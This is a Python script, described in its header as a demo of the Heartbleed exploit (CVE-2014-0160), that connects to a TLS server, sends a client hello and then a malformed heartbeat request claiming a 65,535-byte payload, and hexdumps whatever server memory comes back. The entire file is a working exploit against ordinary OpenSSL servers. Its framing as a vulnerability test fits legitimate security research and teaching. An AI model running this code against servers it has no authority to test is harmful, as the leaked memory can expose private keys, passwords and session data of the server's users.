#!/usr/bin/python

# Demo of CVE-2014-0160 exploit
# With reference to https://stackabuse.com/how-to-exploit-the-heartbleed-bug/
# Credits to Jared Stafford (jspenguin@jspenguin.org)

import sys
import struct
import socket
import time
import select
from optparse import OptionParser

options = OptionParser(
    usage="%prog server [options]",
    description="Test for SSL heartbeat vulnerability (CVE-2014-0160)",
)
options.add_option(
    "-p", "--port", type="int", default=443, help="TCP port to test (default: 443)"
)


hello_packet = bytes.fromhex(
    (
        "16 03 02 00 31"  # Content type = 16 (handshake message); Version = 03 02; Packet length = 00 31
        "01 00 00 2d"  # Message type = 01 (client hello); Length = 00 00 2d
        "03 02"  # Client version = 03 02 (TLS 1.1)
        # Random (uint32 time followed by 28 random bytes):
        "50 0b af bb b7 5a b8 3e f0 ab 9a e3 f3 9c 63 15 33 41 37 ac fd 6c 18 1a 24 60 dc 49 67 c2 fd 96"
        "00"  # Session id = 00
        "00 04 "  # Cipher suite length
        "00 33 c0 11"  # 4 cipher suites
        "01"  # Compression methods length
        "00"  # Compression method 0: no compression = 0
        "00 00"  # Extensions length = 0
    )
    .replace(" ", "")
)

heartbleed_packet = bytes.fromhex(
    (
        "18 03 02 00 03"  # Content type = 18 (heartbeat message); Version = 03 02; Packet length = 00 03
        "01 FF FF"  # Heartbeat message type = 01 (request); Payload length = FF FF
        # Missing a message that is supposed to be FF FF bytes long
    )
    .replace(" ", "")
)


def hexdump(s: bytes):
    for b in range(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = " ".join("%02X" % c for c in lin)
        pdat = "".join((chr(c) if 32 <= c <= 126 else ".") for c in lin)
        print("  %04x: %-48s %s" % (b, hxdat, pdat))

    print("")


def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = b""
    remain = length
    while remain > 0:
        rtime = endtime - time.time()
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            data = s.recv(remain)
            # EOF?
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata


def receive_message(s):
    hdr = recvall(s, 5)
    if hdr is None:
        print("Unexpected EOF receiving record header - server closed connection")
        return None, None, None
    typ, ver, ln = struct.unpack(">BHH", hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        print("Unexpected EOF receiving record payload - server closed connection")
        return None, None, None
    print(
        " ... received message: type = %d, ver = %04x, length = %d"
        % (typ, ver, len(pay))
    )
    return typ, ver, pay


def heartbleed(s):
    s.send(heartbleed_packet)
    while True:
        typ, ver, pay = receive_message(s)
        if typ is None:
            print("No heartbeat response received, server likely not vulnerable")
            return False

        if typ == 24:
            if len(pay) > 3:
                print(
                    "WARNING: server returned more data than it should - server is vulnerable!"
                )
                print("Dumping payload response")
                hexdump(pay)
            else:
                print(
                    "Server processed malformed heartbeat, but did not return any extra data."
                )
            return True

        if typ == 21:
            print("Received alert:")
            hexdump(pay)
            print("Server returned error, likely not vulnerable")
            return False

def main():
    opts, args = options.parse_args()
    if len(args) < 1:
        options.print_help()
        return

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting...")
    sys.stdout.flush()
    s.connect((args[0], opts.port))
    print("Sending Client Hello...")
    sys.stdout.flush()
    s.send(hello_packet)
    print("Waiting for Server Hello...")
    sys.stdout.flush()
    while True:
        typ, ver, pay = receive_message(s)
        if typ == None:
            print("Server closed connection without sending Server Hello.")
            return
        # Look for server hello done message.
        if typ == 22 and pay[0] == 0x0E:
            break

    print("Sending heartbeat request...")
    sys.stdout.flush()
    heartbleed(s)


if __name__ == "__main__":
    main()
